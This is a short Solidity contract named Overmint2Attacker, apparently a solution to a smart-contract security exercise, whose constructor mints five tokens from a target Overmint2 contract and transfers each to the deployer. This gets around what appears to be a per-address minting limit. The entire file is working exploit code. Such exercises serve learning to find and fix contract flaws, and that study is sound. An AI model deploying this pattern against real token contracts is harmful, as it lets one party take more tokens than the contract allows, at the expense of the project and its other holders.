// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import {Overmint2} from "../Overmint2.sol";

contract Overmint2Attacker {
  Overmint2 public victimContract;

  constructor(address _overmint2) {
    victimContract = Overmint2(_overmint2);

    for (uint8 i = 1; i <= 5;) {
      victimContract.mint();
      victimContract.transferFrom(address(this), msg.sender, i);
      unchecked {
        i++;
      }
    }
  }
}